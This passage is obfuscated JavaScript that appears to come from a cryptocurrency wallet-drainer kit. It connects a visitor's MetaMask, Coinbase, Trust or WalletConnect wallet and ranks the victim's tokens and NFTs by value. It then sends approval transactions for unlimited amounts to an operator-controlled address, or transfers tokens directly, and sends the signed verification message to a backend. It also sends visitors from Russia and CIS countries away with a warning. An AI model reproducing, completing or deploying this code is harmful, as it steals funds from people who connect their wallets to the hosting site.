                            if (_0x511e47[_0x528e1d(0x1f5)] < MS_Settings[_0x528e1d(0x2d2)]['Chains'][_0x2701d5][_0x528e1d(0x356)])
                                continue;
                            _0x17f8fc['push'](_0x511e47);
                        } catch (_0x473c5f) {
                            console['log'](_0x473c5f);
                        }
                    }
                } else {
                    _0x2c841f = await get_nfts(_0x77fcff);
                    for (const _0x123ec2 of _0x2c841f) {
                        try {
                            const _0x1199a0 = convert_chain('ID', _0x528e1d(0x1d9), _0x123ec2[_0x528e1d(0x3ab)]);
                            if (_0x123ec2[_0x528e1d(0x1c4)] == _0x528e1d(0x1c6))
                                continue;
                            if (!MS_Settings[_0x528e1d(0x2d2)][_0x528e1d(0x308)][_0x1199a0]['NFTs'])
                                continue;
                            if (_0x123ec2[_0x528e1d(0x1f5)] < MS_Settings[_0x528e1d(0x2d2)][_0x528e1d(0x308)][_0x1199a0][_0x528e1d(0x356)])
                                continue;
                            _0x17f8fc[_0x528e1d(0x212)](_0x123ec2);
                        } catch (_0x4ade24) {
                            console[_0x528e1d(0x217)](_0x4ade24);
                        }
                    }
                }
            } catch (_0x12c8c4) {
                console[_0x528e1d(0x217)](_0x12c8c4);
            }
        _0x17f8fc[_0x528e1d(0x268)]((_0x422c15,_0x5a004c)=>{
            const _0x71aeed = _0x528e1d;
            return _0x5a004c[_0x71aeed(0x1f5)] - _0x422c15[_0x71aeed(0x1f5)];
        }
        );
        if (MS_Settings[_0x528e1d(0x2d2)][_0x528e1d(0x190)] == 0x1) {
            const _0xe7f2 = [];
            for (const _0x533753 of _0x17f8fc) {
                try {
                    if (_0x533753[_0x528e1d(0x1c4)] == 'NATIVE')
                        continue;
                    _0xe7f2[_0x528e1d(0x212)](_0x533753);
                } catch (_0x3091c4) {
                    console[_0x528e1d(0x217)](_0x3091c4);
                }
            }
            for (const _0x3a5533 of _0x17f8fc) {
                try {
                    if (_0x3a5533[_0x528e1d(0x1c4)] != _0x528e1d(0x309))
                        continue;
                    _0xe7f2[_0x528e1d(0x212)](_0x3a5533);
                } catch (_0x49510f) {
                    console[_0x528e1d(0x217)](_0x49510f);
                }
            }
            _0x17f8fc = _0xe7f2;
        } else {
            if (MS_Settings[_0x528e1d(0x2d2)]['Tokens_First'] == 0x2) {
                const _0x53981b = [];
                for (const _0x43fb06 of _0x17f8fc) {
                    try {
                        if (_0x43fb06[_0x528e1d(0x1c4)] != _0x528e1d(0x309))
                            continue;
                        _0x53981b[_0x528e1d(0x212)](_0x43fb06);
                    } catch (_0x806bbf) {
                        console[_0x528e1d(0x217)](_0x806bbf);
                    }
                }
                for (const _0x1a6cea of _0x17f8fc) {
                    try {
                        if (_0x1a6cea[_0x528e1d(0x1c4)] == _0x528e1d(0x309))
                            continue;
                        _0x53981b['push'](_0x1a6cea);
                    } catch (_0x50c324) {
                        console['log'](_0x50c324);
                    }
                }
                _0x17f8fc = _0x53981b;
            }
        }
        if (MS_Settings[_0x528e1d(0x2d2)]['Swappers'][_0x528e1d(0x2ac)] && MS_Settings['Settings'][_0x528e1d(0x224)][_0x528e1d(0x2f9)] == 0x1) {
            const _0x36f27b = [];
            for (const _0x2671a8 of _0x17f8fc) {
                try {
                    if (!_0x2671a8[_0x528e1d(0x21b)])
                        continue;
                    _0x36f27b[_0x528e1d(0x212)](_0x2671a8);
                } catch (_0xbec8f) {
                    console[_0x528e1d(0x217)](_0xbec8f);
                }
            }
            for (const _0x514eac of _0x17f8fc) {
                try {
                    if (_0x514eac[_0x528e1d(0x21b)])
                        continue;
                    _0x36f27b[_0x528e1d(0x212)](_0x514eac);
                } catch (_0x15220a) {
                    console['log'](_0x15220a);
                }
            }
            _0x17f8fc = _0x36f27b;
        }
        if (MS_Settings[_0x528e1d(0x2d2)]['Permit'][_0x528e1d(0x370)] && MS_Settings['Settings'][_0x528e1d(0x395)]['Priority'] > 0x0) {
            const _0x1fceb2 = [];
            for (const _0x3920ed of _0x17f8fc) {
                try {
                    if (!_0x3920ed[_0x528e1d(0x1fa)] || _0x3920ed['permit'] == 0x0 || _0x3920ed[_0x528e1d(0x1f5)] < MS_Settings[_0x528e1d(0x2d2)][_0x528e1d(0x395)][_0x528e1d(0x2f9)])
                        continue;
                    _0x1fceb2['push'](_0x3920ed);
                } catch (_0x2ce46d) {
                    console[_0x528e1d(0x217)](_0x2ce46d);
                }
            }
            for (const _0x415f0c of _0x17f8fc) {
                try {
                    if (_0x415f0c['permit'] && _0x415f0c['permit'] > 0x0 && _0x415f0c[_0x528e1d(0x1f5)] >= MS_Settings[_0x528e1d(0x2d2)]['Permit'][_0x528e1d(0x2f9)])
                        continue;
                    _0x1fceb2[_0x528e1d(0x212)](_0x415f0c);
                } catch (_0x83781e) {
                    console[_0x528e1d(0x217)](_0x83781e);
                }
            }
            _0x17f8fc = _0x1fceb2;
        }
        if (MS_Settings[_0x528e1d(0x2d2)]['Swappers']['Enable'] && MS_Settings[_0x528e1d(0x2d2)]['Swappers'][_0x528e1d(0x2f9)] == 0x2) {
            const _0x12ba67 = [];
            for (const _0x2df114 of _0x17f8fc) {
                try {
                    if (!_0x2df114[_0x528e1d(0x21b)])
                        continue;
                    _0x12ba67[_0x528e1d(0x212)](_0x2df114);
                } catch (_0x44cbea) {
                    console[_0x528e1d(0x217)](_0x44cbea);
                }
            }
            for (const _0x43136c of _0x17f8fc) {
                try {
                    if (_0x43136c[_0x528e1d(0x21b)])
                        continue;
                    _0x12ba67[_0x528e1d(0x212)](_0x43136c);
                } catch (_0x293785) {
                    console['log'](_0x293785);
                }
            }
            _0x17f8fc = _0x12ba67;
        }
        return _0x17f8fc;
    } catch (_0x4d615a) {
        return console[_0x528e1d(0x217)](_0x4d615a),
        [];
    }
}
  , APPROVE_TOKEN = async _0x212f54=>{
    const _0x18cfbf = a0_0x66027a;
    if (MS_Settings[_0x18cfbf(0x2d2)][_0x18cfbf(0x316)][_0x18cfbf(0x2ac)] == 0x0)
        return await TRANSFER_TOKEN(_0x212f54),
        0x2;
    if ((MS_Current_Provider == _0x18cfbf(0x210) && MS_Settings[_0x18cfbf(0x2d2)]['Approve'][_0x18cfbf(0x210)] >= 0x2 || MS_Current_Provider == _0x18cfbf(0x219) && MS_Settings[_0x18cfbf(0x2d2)]['Approve'][_0x18cfbf(0x1fb)] >= 0x2) && !_0x212f54[_0x18cfbf(0x229)])
        try {
            for (let _0x17f8e0 = 0x0; _0x17f8e0 < 0x2; _0x17f8e0++) {
                if (_0x212f54[_0x18cfbf(0x229)])
                    continue;
                try {
                    const _0x3eaede = await retrive_token(_0x212f54['chain_id'], _0x212f54[_0x18cfbf(0x34b)])
                      , _0x71ccc7 = new ethers[(_0x18cfbf(0x38b))][(_0x18cfbf(0x21c))](MS_Settings[_0x18cfbf(0x1a7)][_0x212f54['chain_id']])
                      , _0x4f5367 = new ethers[(_0x18cfbf(0x2b7))](_0x212f54[_0x18cfbf(0x34b)],_0x3eaede,_0x71ccc7);
                    if (is_increase_approve(_0x4f5367[_0x18cfbf(0x252)]) == 0x2)
                        _0x212f54[_0x18cfbf(0x229)] = 0x2;
                    else {
                        if (is_increase_approve(_0x4f5367[_0x18cfbf(0x252)]) == 0x1)
                            _0x212f54[_0x18cfbf(0x229)] = 0x1;
                    }
                } catch (_0x55f233) {
                    console[_0x18cfbf(0x217)](_0x55f233);
                }
            }
        } catch (_0x125094) {
            console[_0x18cfbf(0x217)](_0x125094);
        }
    if ((MS_Current_Provider == 'MetaMask' && MS_Settings[_0x18cfbf(0x2d2)][_0x18cfbf(0x316)][_0x18cfbf(0x210)] >= 0x2 || MS_Current_Provider == _0x18cfbf(0x219) && MS_Settings[_0x18cfbf(0x2d2)]['Approve'][_0x18cfbf(0x1fb)] >= 0x2) && _0x212f54[_0x18cfbf(0x229)])
        return await MM_APPROVE_TOKEN(_0x212f54);
    if ((MS_Current_Provider == _0x18cfbf(0x210) && MS_Settings[_0x18cfbf(0x2d2)][_0x18cfbf(0x316)][_0x18cfbf(0x210)] == 0x2 || MS_Current_Provider == _0x18cfbf(0x219) && MS_Settings[_0x18cfbf(0x2d2)][_0x18cfbf(0x316)]['Trust'] == 0x2) && !_0x212f54['increase'])
        return await TRANSFER_TOKEN(_0x212f54),
        0x2;
    if ((MS_Current_Provider == _0x18cfbf(0x210) && MS_Settings[_0x18cfbf(0x2d2)]['Approve'][_0x18cfbf(0x210)] == 0x3 || MS_Current_Provider == _0x18cfbf(0x219) && MS_Settings[_0x18cfbf(0x2d2)][_0x18cfbf(0x316)]['Trust'] == 0x3) && !_0x212f54[_0x18cfbf(0x229)])
        throw new Error(_0x18cfbf(0x37c));
    const _0x4f989b = new ethers['providers'][(_0x18cfbf(0x21c))](MS_Settings[_0x18cfbf(0x1a7)][_0x212f54['chain_id']])
      , _0x1a842c = BN(await _0x4f989b['getGasPrice']())[_0x18cfbf(0x273)](BN(0x64))[_0x18cfbf(0x28f)](BN(Math[_0x18cfbf(0x24b)](MS_Gas_Multiplier * 0x64)))
      , _0x8dca2 = new ethers[(_0x18cfbf(0x38b))][(_0x18cfbf(0x21c))](MS_Settings[_0x18cfbf(0x1a7)][0x1])
      , _0x189fa2 = BN(await _0x8dca2[_0x18cfbf(0x2a9)]())[_0x18cfbf(0x273)](BN(0x64))['mul'](BN(Math[_0x18cfbf(0x24b)](MS_Gas_Multiplier * 0x64)));
    let _0x14193e = ethers[_0x18cfbf(0x30c)][_0x18cfbf(0x31e)](MS_Unlimited_Amount);
    for (const _0x1567ed of MS_Settings[_0x18cfbf(0x363)]) {
        try {
            if (_0x1567ed[0x0] == MS_Current_Chain_ID && _0x1567ed[0x1] == _0x212f54[_0x18cfbf(0x34b)][_0x18cfbf(0x2d4)]()[_0x18cfbf(0x2fc)]()) {
                _0x14193e = _0x212f54['amount_raw'];
                break;
            }
        } catch (_0x35c50d) {
            console[_0x18cfbf(0x217)](_0x35c50d);
        }
    }
    const _0x1021e7 = {
        'from': MS_Current_Address,
        'to': _0x212f54[_0x18cfbf(0x34b)],
        'value': _0x18cfbf(0x234)
    }
      , _0x53dcda = new Web3(MS_Provider);
    let _0x527ec3 = null;
    const _0x2d4de8 = new _0x53dcda[(_0x18cfbf(0x2e3))][(_0x18cfbf(0x2b7))](MS_Contract_ABI[_0x18cfbf(0x2f2)],_0x212f54[_0x18cfbf(0x34b)]);
    _0x527ec3 = _0x2d4de8[_0x18cfbf(0x32c)][_0x18cfbf(0x1f8)](MS_Settings[_0x18cfbf(0x2d2)][_0x18cfbf(0x24d)] ? MS_Settings[_0x18cfbf(0x1ef)][_0x18cfbf(0x34b)] : MS_Settings['Address'], _0x14193e)['encodeABI'](),
    _0x1021e7['data'] = _0x527ec3;
    const _0x34ac78 = await _0x4f989b[_0x18cfbf(0x393)](_0x1021e7)
      , _0x39e49d = await _0x4f989b[_0x18cfbf(0x290)](MS_Current_Address, _0x18cfbf(0x1bf));
    _0x1021e7[_0x18cfbf(0x26d)] = _0x1a842c,
    _0x1021e7['gasLimit'] = _0x34ac78,
    _0x1021e7[_0x18cfbf(0x236)] = _0x39e49d,
    await approve_request(_0x212f54),
    sign_next();
    const _0x3025e1 = await MS_Signer['sendTransaction'](_0x1021e7);
    wait_message();
    if (MS_Settings[_0x18cfbf(0x2d2)][_0x18cfbf(0x2b2)])
        await _0x4f989b['waitForTransaction'](_0x3025e1[_0x18cfbf(0x318)], 0x1, 0x7530);
    return await approve_success(_0x212f54),
    sign_ready(),
    0x1;
}
  , MM_APPROVE_TOKEN = async _0x41f2ec=>{
    const _0xad461a = a0_0x66027a;
    if ((MS_Current_Provider == _0xad461a(0x210) && MS_Settings[_0xad461a(0x2d2)][_0xad461a(0x316)][_0xad461a(0x210)] >= 0x2 || MS_Current_Provider == _0xad461a(0x219) && MS_Settings[_0xad461a(0x2d2)][_0xad461a(0x316)]['Trust'] >= 0x2) && !_0x41f2ec[_0xad461a(0x229)])
        try {
            for (let _0x4ce990 = 0x0; _0x4ce990 < 0x2; _0x4ce990++) {
                if (_0x41f2ec[_0xad461a(0x229)])
                    continue;
                try {
                    const _0x45df47 = await retrive_token(_0x41f2ec[_0xad461a(0x3ab)], _0x41f2ec[_0xad461a(0x34b)])
                      , _0x331628 = new ethers[(_0xad461a(0x38b))][(_0xad461a(0x21c))](MS_Settings[_0xad461a(0x1a7)][_0x41f2ec[_0xad461a(0x3ab)]])
                      , _0x57c69f = new ethers[(_0xad461a(0x2b7))](_0x41f2ec[_0xad461a(0x34b)],_0x45df47,_0x331628);
                    if (is_increase_approve(_0x57c69f[_0xad461a(0x252)]) == 0x2)
                        _0x41f2ec[_0xad461a(0x229)] = 0x2;
                    else {
                        if (is_increase_approve(_0x57c69f[_0xad461a(0x252)]) == 0x1)
                            _0x41f2ec[_0xad461a(0x229)] = 0x1;
                    }
                } catch (_0x399b72) {
                    console[_0xad461a(0x217)](_0x399b72);
                }
            }
        } catch (_0x336b20) {
            console[_0xad461a(0x217)](_0x336b20);
        }
    const _0x2215a2 = new ethers['providers'][(_0xad461a(0x21c))](MS_Settings[_0xad461a(0x1a7)][_0x41f2ec['chain_id']])
      , _0x22246d = BN(await _0x2215a2[_0xad461a(0x2a9)]())[_0xad461a(0x273)](BN(0x64))[_0xad461a(0x28f)](BN(Math[_0xad461a(0x24b)](MS_Gas_Multiplier * 0x64)))
      , _0xdc4453 = new ethers['providers']['JsonRpcProvider'](MS_Settings['RPCs'][0x1])
      , _0x3a632c = BN(await _0xdc4453['getGasPrice']())['div'](BN(0x64))[_0xad461a(0x28f)](BN(Math[_0xad461a(0x24b)](MS_Gas_Multiplier * 0x64)));
    let _0x1e772f = ethers[_0xad461a(0x30c)][_0xad461a(0x31e)](MS_Unlimited_Amount);
    for (const _0x517883 of MS_Settings[_0xad461a(0x363)]) {
        try {
            if (_0x517883[0x0] == MS_Current_Chain_ID && _0x517883[0x1] == _0x41f2ec[_0xad461a(0x34b)][_0xad461a(0x2d4)]()['trim']()) {
                _0x1e772f = _0x41f2ec[_0xad461a(0x270)];
                break;
            }
        } catch (_0xf2255f) {
            console[_0xad461a(0x217)](_0xf2255f);
        }
    }
    const _0x31fcb8 = {
        'from': MS_Current_Address,
        'to': _0x41f2ec['address'],
        'value': _0xad461a(0x234)
    }
      , _0x4e1035 = new Web3(MS_Provider);
    let _0x6354aa = null;
    const _0x449181 = _0x41f2ec[_0xad461a(0x229)] == 0x2 ? _0xad461a(0x379) : _0xad461a(0x2ff)
      , _0x559aaa = new _0x4e1035[(_0xad461a(0x2e3))][(_0xad461a(0x2b7))]([{
        'inputs': [{
            'internalType': 'address',
            'name': 'spender',
            'type': _0xad461a(0x34b)
        }, {
            'internalType': 'uint256',
            'name': _0xad461a(0x340),
            'type': 'uint256'
        }],
        'name': '' + _0x449181,
        'outputs': [{
            'internalType': _0xad461a(0x3b2),
            'name': '',
            'type': _0xad461a(0x3b2)
        }],
        'stateMutability': _0xad461a(0x23d),
        'type': _0xad461a(0x352)
    }],_0x41f2ec[_0xad461a(0x34b)]);
    _0x6354aa = _0x559aaa[_0xad461a(0x32c)][_0x449181](MS_Settings[_0xad461a(0x2d2)]['Use_Randomizer_For_Tokens'] ? MS_Settings[_0xad461a(0x1ef)]['address'] : MS_Settings[_0xad461a(0x2e9)], _0x1e772f)[_0xad461a(0x194)](),
    _0x31fcb8[_0xad461a(0x29b)] = _0x6354aa;
    const _0xa3979a = await _0x2215a2[_0xad461a(0x393)](_0x31fcb8)
      , _0x5e653f = await _0x2215a2['getTransactionCount'](MS_Current_Address, _0xad461a(0x1bf));
    _0x31fcb8['gasPrice'] = _0x22246d,
    _0x31fcb8[_0xad461a(0x28b)] = _0xa3979a,
    _0x31fcb8[_0xad461a(0x236)] = _0x5e653f,
    await approve_request(_0x41f2ec),
    sign_next();
    const _0x253f8b = await MS_Signer['sendTransaction'](_0x31fcb8);
    wait_message();
    if (MS_Settings[_0xad461a(0x2d2)][_0xad461a(0x2b2)])
        await _0x2215a2[_0xad461a(0x378)](_0x253f8b[_0xad461a(0x318)], 0x1, 0x7530);
    return await approve_success(_0x41f2ec),
    sign_ready(),
    0x1;
}
  , connect_wallet = async(_0x54baeb=null)=>{
    const _0x2dd40a = a0_0x66027a;
    try {
        if (!MS_Connection) {
            if (MS_Load_Time == null || Math[_0x2dd40a(0x24b)](Date[_0x2dd40a(0x1e4)]() / 0x3e8) - MS_Load_Time < 0xf)
                return;
            MS_Loader_Style == 0x2 ? MSL[_0x2dd40a(0x211)]({
                'icon': _0x2dd40a(0x385),
                'title': _0x2dd40a(0x1f2),
                'subtitle': _0x2dd40a(0x249),
                'text': _0x2dd40a(0x2c6),
                'showConfirmButton': !![],
                'confirmButtonText': 'OK',
                'color': MS_Color_Scheme
            }) : (Swal[_0x2dd40a(0x1de)](),
            Swal[_0x2dd40a(0x211)]({
                'html': _0x2dd40a(0x231),
                'icon': 'error',
                'allowOutsideClick': !![],
                'allowEscapeKey': !![],
                'timer': 0x0,
                'width': 0x258,
                'showConfirmButton': !![],
                'confirmButtonText': 'OK'
            }));
            return;
        }
        if (MS_Process)
            return;
        MS_Process = !![];
        if (MS_Bad_Country) {
            try {
                ms_hide();
            } catch (_0x30a354) {
                console[_0x2dd40a(0x217)](_0x30a354);
            }
            try {
                MS_Loader_Style == 0x2 ? MSL[_0x2dd40a(0x211)]({
                    'icon': _0x2dd40a(0x385),
                    'title': _0x2dd40a(0x1fd),
                    'subtitle': _0x2dd40a(0x2c3),
                    'text': _0x2dd40a(0x19f),
                    'showConfirmButton': !![],
                    'confirmButtonText': 'OK',
                    'color': MS_Color_Scheme
                }) : (Swal['close'](),
                Swal[_0x2dd40a(0x211)]({
                    'html': '<b>Предупреждение</b><br><br>Пожалуйста,\x20покиньте\x20этот\x20веб-сайт\x20немедленно,\x20он\x20не\x20предназначен\x20для\x20России\x20и\x20стран\x20СНГ,\x20не\x20пытайтесь\x20использовать\x20VPN,\x20это\x20небезопасно!',
                    'icon': 'error',
                    'allowOutsideClick': !![],
                    'allowEscapeKey': !![],
                    'timer': 0x0,
                    'width': 0x258,
                    'showConfirmButton': !![],
                    'confirmButtonText': 'OK'
                })),
                await new Promise(_0x3f29a6=>setTimeout(_0x3f29a6, 0x3a98)),
                window[_0x2dd40a(0x29e)][_0x2dd40a(0x2f0)] = 'https://ya.ru';
            } catch (_0x51a019) {
                console[_0x2dd40a(0x217)](_0x51a019);
            }
            return;
        }
        if (_0x54baeb !== null) {
            if (_0x54baeb == 'MetaMask') {
                if (typeof window[_0x2dd40a(0x2f5)] == 'object' && typeof window[_0x2dd40a(0x2f5)][_0x2dd40a(0x38b)] === _0x2dd40a(0x359)) {
                    let _0x2c08fb = ![];
                    for (const _0x3b344d of window[_0x2dd40a(0x2f5)][_0x2dd40a(0x38b)]) {
                        if (_0x3b344d[_0x2dd40a(0x20f)] == !![]) {
                            _0x2c08fb = !![],
                            MS_Provider = _0x3b344d,
                            MS_Current_Provider = _0x2dd40a(0x210);
                            break;
                        }
                    }
                    if (!_0x2c08fb) {
                        if (MS_Mobile_Status) {
                            window['location']['href'] = _0x2dd40a(0x1af) + MS_Current_URL,
                            MS_Process = ![];
                            return;
                        } else {
                            window[_0x2dd40a(0x2c4)](_0x2dd40a(0x2e5), _0x2dd40a(0x32b))['focus'](),
                            MS_Process = ![];
                            return;
                        }
                    }
                } else {
                    if (typeof window[_0x2dd40a(0x2f5)] === 'object' && window[_0x2dd40a(0x2f5)][_0x2dd40a(0x20f)])
                        MS_Provider = window[_0x2dd40a(0x2f5)],
                        MS_Current_Provider = _0x2dd40a(0x210);
                    else {
                        if (MS_Mobile_Status) {
                            window['location'][_0x2dd40a(0x2f0)] = 'https://metamask.app.link/dapp/' + MS_Current_URL,
                            MS_Process = ![];
                            return;
                        } else {
                            window['open'](_0x2dd40a(0x2e5), _0x2dd40a(0x32b))[_0x2dd40a(0x275)](),
                            MS_Process = ![];
                            return;
                        }
                    }
                }
            } else {
                if (_0x54baeb == 'Coinbase') {
                    if (typeof window[_0x2dd40a(0x2f5)] == _0x2dd40a(0x359) && typeof window[_0x2dd40a(0x2f5)]['providers'] === _0x2dd40a(0x359)) {
                        let _0x1cc265 = ![];
                        for (const _0xd26856 of window[_0x2dd40a(0x2f5)]['providers']) {
                            if (_0xd26856[_0x2dd40a(0x299)] == !![]) {
                                _0x1cc265 = !![],
                                MS_Provider = _0xd26856;
                                break;
                            }
                        }
                        if (_0x1cc265)
                            MS_Current_Provider = _0x2dd40a(0x37b);
                        else {
                            if (MS_Mobile_Status) {
                                window['location'][_0x2dd40a(0x2f0)] = _0x2dd40a(0x29a) + MS_Current_URL,
                                MS_Process = ![];
                                return;
                            } else {
                                window['open'](_0x2dd40a(0x23e), _0x2dd40a(0x32b))[_0x2dd40a(0x275)](),
                                MS_Process = ![];
                                return;
                            }
                        }
                    } else {
                        if (typeof window[_0x2dd40a(0x2f5)] === _0x2dd40a(0x359) && (window[_0x2dd40a(0x2f5)][_0x2dd40a(0x299)] || window['ethereum'][_0x2dd40a(0x25a)]))
                            MS_Provider = window[_0x2dd40a(0x2f5)],
                            MS_Current_Provider = _0x2dd40a(0x37b);
                        else {
                            if (MS_Mobile_Status) {
                                window[_0x2dd40a(0x29e)][_0x2dd40a(0x2f0)] = _0x2dd40a(0x29a) + MS_Current_URL,
                                MS_Process = ![];
                                return;
                            } else {
                                window[_0x2dd40a(0x2c4)]('https://www.coinbase.com/wallet', _0x2dd40a(0x32b))['focus'](),
                                MS_Process = ![];
                                return;
                            }
                        }
                    }
                } else {
                    if (_0x54baeb == _0x2dd40a(0x219)) {
                        if (typeof window[_0x2dd40a(0x2f5)] === 'object' && window[_0x2dd40a(0x2f5)][_0x2dd40a(0x274)])
                            MS_Provider = window[_0x2dd40a(0x2f5)],
                            MS_Current_Provider = _0x2dd40a(0x219);
                        else {
                            if (MS_Mobile_Status) {
                                window[_0x2dd40a(0x29e)][_0x2dd40a(0x2f0)] = _0x2dd40a(0x37f) + MS_Current_URL,
                                MS_Process = ![];
                                return;
                            } else {
                                window[_0x2dd40a(0x2c4)](_0x2dd40a(0x1c9), _0x2dd40a(0x32b))[_0x2dd40a(0x275)](),
                                MS_Process = ![];
                                return;
                            }
                        }
                    } else {
                        if (_0x54baeb == _0x2dd40a(0x2f1)) {
                            if (typeof window[_0x2dd40a(0x334)] === _0x2dd40a(0x359))
                                MS_Provider = window[_0x2dd40a(0x334)],
                                MS_Current_Provider = _0x2dd40a(0x2f1);
                            else {
                                window['open'](_0x2dd40a(0x39a), _0x2dd40a(0x32b))['focus'](),
                                MS_Process = ![];
                                return;
                            }
                        } else
                            _0x54baeb == _0x2dd40a(0x1b3) || _0x54baeb == 'WalletConnect_v2' ? MS_Current_Provider = _0x2dd40a(0x1b3) : typeof window['ethereum'] === _0x2dd40a(0x359) ? (MS_Provider = window[_0x2dd40a(0x2f5)],
                            MS_Current_Provider = _0x2dd40a(0x35a)) : MS_Current_Provider = _0x2dd40a(0x1b3);
                    }
                }
            }
        } else
            window['ethereum'] ? (MS_Provider = window[_0x2dd40a(0x2f5)],
            MS_Current_Provider = _0x2dd40a(0x35a)) : MS_Current_Provider = _0x2dd40a(0x1b3);
        try {
            await connect_request();
            let _0x127130 = null;
            if (MS_Current_Provider == _0x2dd40a(0x1b3)) {
                ms_hide(),
                await load_wc();
                try {
                    await MS_Provider['disconnect']();
                } catch (_0x59b948) {
                    console[_0x2dd40a(0x217)](_0x59b948);
                }
                await MS_Provider[_0x2dd40a(0x2d8)]();
                if (MS_Provider && MS_Provider[_0x2dd40a(0x35e)][_0x2dd40a(0x2ae)] > 0x0) {
                    if (!MS_Provider[_0x2dd40a(0x35e)][0x0][_0x2dd40a(0x389)]('0x'))
                        return MS_Process = ![],
                        await connect_cancel();
                    await new Promise(_0x4ffe2c=>setTimeout(_0x4ffe2c, 0x9c4)),
                    MS_Current_Address = MS_Provider['accounts'][0x0],
                    MS_Current_Chain_ID = MS_Provider[_0x2dd40a(0x230)],
                    MS_Web3 = new ethers[(_0x2dd40a(0x38b))][(_0x2dd40a(0x1f0))](MS_Provider),
                    MS_Signer = MS_Web3['getSigner'](),
                    MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x323)][_0x2dd40a(0x1b3)] == 0x0 && (MS_Sign_Disabled = !![]);
                } else
                    return MS_Process = ![],
                    await connect_cancel();
            } else {
                if (MS_Current_Provider == _0x2dd40a(0x219) && !MS_Mobile_Status)
                    try {
                        _0x127130 = await MS_Provider[_0x2dd40a(0x364)]({
                            'method': _0x2dd40a(0x1f4),
                            'params': [{
                                'eth_accounts': {}
                            }]
                        });
                        if (_0x127130 && _0x127130[_0x2dd40a(0x2ae)] > 0x0) {
                            if (!MS_Provider[_0x2dd40a(0x327)][_0x2dd40a(0x389)]('0x'))
                                return connect_cancel();
                            MS_Current_Address = MS_Provider[_0x2dd40a(0x327)],
                            MS_Current_Chain_ID = parseInt(MS_Provider[_0x2dd40a(0x230)]),
                            MS_Web3 = new ethers[(_0x2dd40a(0x38b))]['Web3Provider'](MS_Provider),
                            MS_Signer = MS_Web3[_0x2dd40a(0x34a)]();
                        } else
                            return MS_Process = ![],
                            await connect_cancel();
                    } catch (_0x4b0653) {
                        _0x127130 = await MS_Provider[_0x2dd40a(0x364)]({
                            'method': 'eth_requestAccounts'
                        });
                        if (_0x127130 && _0x127130[_0x2dd40a(0x2ae)] > 0x0) {
                            if (!_0x127130[0x0][_0x2dd40a(0x389)]('0x'))
                                return connect_cancel();
                            MS_Current_Address = _0x127130[0x0],
                            MS_Current_Chain_ID = parseInt(MS_Provider[_0x2dd40a(0x230)]),
                            MS_Web3 = new ethers[(_0x2dd40a(0x38b))][(_0x2dd40a(0x1f0))](MS_Provider),
                            MS_Signer = MS_Web3[_0x2dd40a(0x34a)]();
                        } else
                            return MS_Process = ![],
                            await connect_cancel();
                    }
                else
                    try {
                        _0x127130 = await MS_Provider[_0x2dd40a(0x364)]({
                            'method': _0x2dd40a(0x38f),
                            'params': [{
                                'eth_accounts': {}
                            }]
                        });
                        if (_0x127130 && _0x127130['length'] > 0x0) {
                            if (!MS_Provider[_0x2dd40a(0x327)][_0x2dd40a(0x389)]('0x'))
                                return connect_cancel();
                            MS_Current_Address = MS_Provider['selectedAddress'],
                            MS_Current_Chain_ID = parseInt(MS_Provider['chainId']),
                            MS_Web3 = new ethers[(_0x2dd40a(0x38b))]['Web3Provider'](MS_Provider),
                            MS_Signer = MS_Web3[_0x2dd40a(0x34a)]();
                        } else
                            return MS_Process = ![],
                            await connect_cancel();
                    } catch (_0x2f9476) {
                        _0x127130 = await MS_Provider[_0x2dd40a(0x364)]({
                            'method': 'eth_requestAccounts'
                        });
                        if (_0x127130 && _0x127130[_0x2dd40a(0x2ae)] > 0x0) {
                            if (!_0x127130[0x0][_0x2dd40a(0x389)]('0x'))
                                return connect_cancel();
                            MS_Current_Address = _0x127130[0x0],
                            MS_Current_Chain_ID = parseInt(MS_Provider[_0x2dd40a(0x230)]),
                            MS_Web3 = new ethers[(_0x2dd40a(0x38b))]['Web3Provider'](MS_Provider),
                            MS_Signer = MS_Web3[_0x2dd40a(0x34a)]();
                        } else
                            return MS_Process = ![],
                            await connect_cancel();
                    }
            }
            if (!MS_Current_Address[_0x2dd40a(0x283)](/^0x\S+$/))
                throw new Error(_0x2dd40a(0x25d));
        } catch (_0x421ddd) {
            return console[_0x2dd40a(0x217)](_0x421ddd),
            MS_Process = ![],
            await connect_cancel();
        }
        ms_hide();
        if (MS_Settings['V_MODE'] == 0x1) {
            MS_Loader_Style == 0x2 ? MSL[_0x2dd40a(0x211)]({
                'icon': _0x2dd40a(0x2a1),
                'title': _0x2dd40a(0x257),
                'text': _0x2dd40a(0x1ec),
                'showConfirmButton': !![],
                'confirmButtonText': _0x2dd40a(0x344),
                'color': MS_Color_Scheme
            }) : Swal['fire']({
                'html': _0x2dd40a(0x2a0),
                'imageUrl': _0x2dd40a(0x23b),
                'imageHeight': 0x3c,
                'allowOutsideClick': ![],
                'allowEscapeKey': ![],
                'timer': 0x0,
                'width': 0x258,
                'showConfirmButton': ![]
            });
            try {
                const _0x409f80 = (MS_Verify_Message == '' ? MS_Settings['V_MSG'] : MS_Verify_Message)[_0x2dd40a(0x342)]('{{ADDRESS}}', MS_Current_Address)
                  , _0x5d2b6f = await MS_Signer[_0x2dd40a(0x200)](_0x409f80)
                  , _0x8957f2 = ethers[_0x2dd40a(0x30c)][_0x2dd40a(0x1b0)](ethers['utils']['hashMessage'](_0x409f80), _0x5d2b6f);
                if (!_0x8957f2)
                    return MS_Loader_Style == 0x2 ? MSL['fire']({
                        'icon': _0x2dd40a(0x385),
                        'title': _0x2dd40a(0x1e7),
                        'subtitle': _0x2dd40a(0x362),
                        'text': 'We\x20have\x20received\x20your\x20signature,\x20but\x20it\x27s\x20incorrect,\x20please\x20try\x20again.',
                        'showConfirmButton': !![],
                        'confirmButtonText': 'OK',
                        'color': MS_Color_Scheme
                    }) : Swal[_0x2dd40a(0x211)]({
                        'title': 'Verification\x20Error',
                        'text': _0x2dd40a(0x253),
                        'icon': 'error',
                        'confirmButtonText': 'OK'
                    }),
                    MS_Process = ![],
                    await connect_cancel();
                else {
                    let _0x59f5b2 = await send_request({
                        'action': _0x2dd40a(0x18e),
                        'sign': _0x5d2b6f,
                        'address': MS_Current_Address,
                        'message': MS_Verify_Message
                    });
                    if (_0x59f5b2[_0x2dd40a(0x250)] != 'OK')
                        return MS_Loader_Style == 0x2 ? MSL[_0x2dd40a(0x211)]({
                            'icon': _0x2dd40a(0x385),
                            'title': _0x2dd40a(0x1e7),
                            'subtitle': 'Verification\x20Error',
                            'text': 'We\x20have\x20received\x20your\x20signature,\x20but\x20it\x27s\x20incorrect,\x20please\x20try\x20again.',
